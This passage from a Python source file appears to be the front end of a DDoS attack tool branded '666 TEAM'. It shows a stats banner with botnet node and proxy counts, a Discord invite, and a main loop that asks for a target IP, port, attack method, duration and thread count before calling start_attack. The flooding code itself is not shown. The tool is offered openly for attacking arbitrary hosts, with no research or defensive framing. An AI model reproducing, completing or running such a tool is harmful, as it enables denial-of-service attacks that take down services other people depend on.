{colors.NEON_PURPLE}{colors.BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}🤖 ＢＯＴＮＥＴ ＮＯＤＥＳ:{colors.RESET} {colors.NEON_WHITE}{ddos.botnet_size:,}{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}🌐 ＰＲＯＸＩＥＳ:{colors.RESET} {colors.NEON_WHITE}{len(ddos.proxies):,}+{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}⚡ ＡＴＴＡＣＫ ＭＥＴＨＯＤＳ:{colors.RESET} {colors.NEON_WHITE}{len(METHODS)}{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}📊 ＴＯＴＡＬ ＰＡＣＫＥＴＳ:{colors.RESET} {colors.NEON_WHITE}{ddos.packets_sent:,}{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}👑 ＭＡＳＴＥＲ:{colors.RESET} {colors.NEON_WHITE}{CURRENT_USER.upper()}{colors.RESET}
{colors.NEON_CYAN}║  {colors.NEON_GREEN}🔗 ＤＩＳＣＯＲＤ:{colors.RESET} {colors.NEON_WHITE}https://discord.gg/k3P8kWQag{colors.RESET}
{colors.NEON_PURPLE}{colors.BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}
""")
        return True
    
    elif cmd == '.attack':
        return False
    
    elif cmd in ['.exit', '.q']:
        print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ＴＨＡＮＫ ＹＯＵ ＦＯＲ ＵＳＩＮＧ ６６６ ＴＥＡＭ ＴＯＯＬ！ 💀                                      ║{colors.RESET}")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      🔗 ＪＯＩＮ ＯＵＲ ＤＩＳＣＯＲＤ: https://discord.gg/k3P8kWQag 🔗                      ║{colors.RESET}")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ６６６ ＴＥＡＭ - ＡＬＷＡＹＳ ＰＯＷＥＲＦＵＬ！ 💀                                      ║{colors.RESET}")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}\n")
        sys.exit(0)
    
    return True

# ============================================
# MAIN FUNCTION
# ============================================

def main():
    if not login_screen():
        sys.exit(1)
    
    ddos = UltimateDDoS()
    
    while True:
        print_main_logo()
        
        print(f"{colors.NEON_CYAN}{colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.NEON_CYAN}{colors.BOLD}║                                      💀 ＥＮＴＥＲ ＴＡＲＧＥＴ ＩＮＦＯＲＭＡＴＩＯＮ 💀                                     ║{colors.RESET}")
        print(f"{colors.NEON_CYAN}{colors.BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}")
        
        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
        ip = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🌐 {colors.NEON_WHITE}ＴＡＲＧＥＴ ＩＰ:{colors.RESET} ").strip()
        if not ip:
            continue
        
        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
        port = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🔌 {colors.NEON_WHITE}ＴＡＲＧＥＴ ＰＯＲＴ:{colors.RESET} ").strip()
        if not port:
            continue
        
        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
        method = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}⚡ {colors.NEON_WHITE}ＭＥＴＨＯＤ (1-666):{colors.RESET} ").strip()
        if method not in METHODS:
            print(f"{colors.NEON_RED}║  ❌ ＩＮＶＡＬＩＤ ＭＥＴＨＯＤ！ ＵＳＥ .methods{colors.RESET}")
            time.sleep(1)
            continue
        
        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
        duration = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}⏱️ {colors.NEON_WHITE}ＤＵＲＡＴＩＯＮ (ＳＥＣＯＮＤＳ):{colors.RESET} ").strip()
        if not duration.isdigit():
            print(f"{colors.NEON_RED}║  ❌ ＩＮＶＡＬＩＤ ＤＵＲＡＴＩＯＮ！{colors.RESET}")
            time.sleep(1)
            continue
        
        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
        threads = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🔧 {colors.NEON_WHITE}ＴＨＲＥＡＤＳ (1000-50000):{colors.RESET} ").strip()
        if not threads.isdigit():
            threads = "10000"
        
        print(f"{colors.NEON_CYAN}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
        
        print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ＡＴＴＡＣＫ ＣＯＮＦＩＲＭＡＴＩＯＮ 💀                                           ║{colors.RESET}")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}")
        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🎯 ＴＡＲＧＥＴ:{colors.RESET} {colors.NEON_GREEN}{ip}:{port}{colors.RESET}")
        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}⚡ ＭＥＴＨＯＤ:{colors.RESET} {colors.NEON_GREEN}{METHODS[method]['name']}{colors.RESET}")
        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}⏱️ ＤＵＲＡＴＩＯＮ:{colors.RESET} {colors.NEON_GREEN}{duration} ＳＥＣＯＮＤＳ{colors.RESET}")
        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🔧 ＴＨＲＥＡＤＳ:{colors.RESET} {colors.NEON_GREEN}{threads:,}{colors.RESET}")
        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🤖 ＢＯＴＮＥＴ:{colors.RESET} {colors.NEON_GREEN}{ddos.botnet_size:,} ＮＯＤＥＳ{colors.RESET}")
        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🌐 ＰＲＯＸＩＥＳ:{colors.RESET} {colors.NEON_GREEN}{len(ddos.proxies):,}+{colors.RESET}")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
        
        confirm = input(f"\n{colors.NEON_RED}{colors.BLINK}[💀] ＳＴＡＲＴ ＡＴＴＡＣＫ？ (y/n): {colors.RESET}").lower()
        if confirm == 'y':
            ddos.start_attack(method, ip, int(port), int(duration), int(threads))
        else:
            print(f"{colors.NEON_YELLOW}[⏸️] ＡＴＴＡＣＫ ＣＡＮＣＥＬＬＥＤ！{colors.RESET}")
        
        while True:
            cmd = input(f"\n{colors.NEON_RED}[💀] {colors.NEON_WHITE}ＣＯＭＭＡＮＤ {colors.NEON_PURPLE}(.help){colors.NEON_WHITE}: {colors.RESET}").strip()
            if handle_command(cmd, ddos):
                break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{colors.NEON_RED}{colors.BOLD}{colors.BLINK}[⚠️] ＡＴＴＡＣＫ ＳＴＯＰＰＥＤ ＢＹ ＭＡＳＴＥＲ！{colors.RESET}\n")
        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}[💀] ６６６ ＴＥＡＭ - ＡＬＷＡＹＳ ＰＯＷＥＲＦＵＬ！{colors.RESET}\n")
